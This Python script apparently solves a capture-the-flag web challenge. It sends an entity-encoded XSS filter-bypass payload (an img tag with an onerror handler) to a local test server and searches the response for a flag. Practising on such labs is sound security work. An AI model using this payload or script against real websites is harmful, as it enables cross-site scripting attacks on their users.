import requests
import urllib.parse

# Re-test the successful XSS bypass to be absolutely certain about the output
base_url = "http://127.0.0.1:33204"
endpoint = "/page"

# The successful bypass payload
payload = "&lt;img src=x onerror=alert('XSS')&gt;"

print("="*80)
print("FINAL FLAG CHECK - XSS Bypass Payload")
print("="*80)
print()
print(f"Testing: {payload}")
print()

encoded = urllib.parse.quote(payload, safe='')
url = f"{base_url}{endpoint}?name={encoded}"
response = requests.get(url, timeout=10)

print("FULL SCRIPT OUTPUT - Searching for FLAG pattern:")
print("-"*80)
print(response.text)
print("-"*80)
print()

# Search for flag pattern
import re
flags = re.findall(r'FLAG\{[^}]+\}', response.text)

if flags:
    print(f"[!] FLAG(S) FOUND: {flags}")
    for flag in flags:
        print(f"    Exact flag: {flag}")
else:
    print("[-] NO FLAG{} PATTERN FOUND IN OUTPUT")
    print("Status: XSS bypass vector confirmed working, but no flag in response")

print()
print("="*80)
print("VERIFICATION COMPLETE")
print("="*80)
